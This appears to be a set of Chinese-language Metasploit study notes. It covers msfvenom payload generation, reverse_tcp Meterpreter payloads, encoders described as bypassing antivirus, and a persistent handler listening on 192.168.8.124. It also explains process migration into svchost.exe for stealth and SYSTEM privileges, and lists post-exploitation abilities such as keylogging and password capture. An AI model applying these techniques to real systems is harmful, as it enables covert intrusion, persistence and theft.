msf基本术语

  • 渗透攻击（exploit）

    利用系统、程序、或者服务漏洞进行攻击的一个过程

  • 攻击载荷 （payload）

    相当于木马，攻击者在目标系统上执行一段代码，改代码具有反弹连接，创建用户执行其它系统命令的功能

  • 模块 （module）

    是指Metasploit框架中所使用的一段软件代码组件。

  • 监听器 （listen）

    用来等待介入网络连接的组件 （为了建立木马连接）

msf payload模块

msfvenom

msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。

简单来说 就是用来生成payload 木马的

所有参数

常用参数

查看此payload支持什么平台、有哪些选项

msfvenom -p windows/meterpreter/reverse_tcp --list-options

查看所有payload

msfvenom --list payload

查看所有编码器（用来bypass av）

msfvenom --list encoders //评级最高的两个 cmd/powershell_base64、x86/shikata_ga_nai(动态编码，免杀中使用频率最高的一个编码器)

监听会话

防止假session

​ 解决连上就断开的情况,防止假死和假session

防止sessions 意外退出

​ 解决会话5分钟内没有任何操作，会被自动杀掉的情况

session 永不关闭

​ 默认情况下，一星期会话会被强制关闭，设置0 可永久不会关闭

handler后台持续监听

​ 一般情况下建立一个会话后会自动关闭监听，使用以下指令*可以始终保持监听*

​ 也可以在msf下直接使用

handler -H 192.168.8.124 -P 1122 -p windows/meterpreter/reverse_tcp

payload 可持续化

​ 一般payload会单独启用进程，但是这种进程很容易被发现，关闭。 为了刚好的持续化可以使用

迁移进程后，默认进程会自动关闭

​ msfvenom 生成payload时，添加让它允许后自动迁移 进程

-p 攻击载荷 -e 编码器 -b 避免程序出现的字符 -i 编码次数 -a 系统版本 –platform 系统 -f 指定程序格式 -o 输出程序

PrependMigrate=true PrependMigratePorc=svhost.exe 使payload允许时，默认迁移到svhost.exe 这个进程

如果拿到shell，发现权限不是system，也可以使用进程迁移的方法，**迁移到有system权限的进程下。那么此时你的权限就是system权限

msf后渗透模块

payload在目标机器执行成功后会建立 meterpreter 会话。 此会话可以执行很多牛逼操作如（添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。）

前提看payload

  1. 看权限
  2. 看payload所用脚本协议

php/meterpreter/reverse_tcp 这个为php脚本的payload。 权限为网络的，执行的操作就少

windows/meterpreter/reverse_tcp 这个为系统payload，权限为系统的，执行的操作***多***
